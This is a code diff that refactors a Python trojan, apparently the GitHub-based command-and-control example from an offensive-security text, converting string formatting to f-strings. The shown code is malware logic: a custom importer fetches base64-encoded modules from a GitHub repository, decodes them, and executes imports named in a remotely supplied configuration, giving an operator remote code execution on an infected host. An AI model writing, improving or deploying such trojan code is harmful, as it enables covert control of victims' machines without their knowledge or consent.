@@ -9,8 +9,8 @@ import queue
 from github3 import login
 
 trojan_id = "abc"
-trojan_config = "config/{}.json".format(trojan_id)
-data_path = "data/{}/".format(trojan_id)
+trojan_config = f"config/{trojan_id}.json"
+data_path = f"data/{trojan_id}/"
 trojan_modules = []
 configured = False
 task_queue = queue.Queue()
@@ -22,9 +22,8 @@ class GitImporter(object):
 
     def find_module(self, fullname, path=None):
         if configured:
-            print("[*] Attempting to retrieve %s" % fullname)
-            new_library = get_file_contents("modules/%s" % fullname)
-            if new_library:
+            print(f"[*] Attempting to retrieve {fullname}")
+            if new_library := get_file_contents(f"modules/{fullname}"):
                 self.current_module_code = base64.b64decode(new_library)
                 return self
         return None
@@ -60,7 +59,7 @@ def get_file_contents(filepath):
     tree = branch.commit.commit.tree.to_tree().recurse()
     for filename in tree.tree:
         if filepath in filename.path:
-            print("[*] Found file %s" % filepath)
+            print(f"[*] Found file {filepath}")
             blob = repo.blob(filename._json_data['sha'])
             return blob.content
     return None
@@ -74,7 +73,7 @@ def get_trojan_config():
 
     for tasks in configuration:
         if tasks['module'] not in sys.modules:
-            exec("import %s" % tasks['module'])
+            exec(f"import {tasks['module']}")
 
     return configuration
 
